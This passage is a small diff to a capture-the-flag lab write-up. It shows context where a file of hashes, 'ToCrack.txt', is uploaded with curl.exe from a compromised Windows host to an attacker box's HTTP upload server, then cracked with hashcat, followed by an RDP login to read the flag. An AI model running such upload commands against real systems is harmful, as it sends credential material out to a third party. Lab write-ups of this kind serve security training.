@@ -166,7 +166,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.66.129.99 - - [11/Oct/2026 08:13:30] [Uploaded] "ToCrack.txt" --> /root/ToCrack.txt
 10.66.129.99 - - [11/Oct/2026 08:13:30] "POST /upload HTTP/1.1" 204 -
 ```
-upload file to attackbox.
+Upload file to attackbox:
 ```
 PS C:\Users\dark> curl.exe -F "files=@C:\users\dark\ToCrack.txt" http://10.66.116.47/upload
 PS C:\Users\dark>
@@ -255,8 +255,6 @@ Hardware.Mon.#1..: Util: 60%
 
 Started: Sun Oct 11 08:30:49 2026
 Stopped: Sun Oct 11 08:31:50 2026
-root@ip-10-66-116-47:~# 
-
 ```
 Then login with xfreerdp and on desktop is the file flag.txt:
 ```
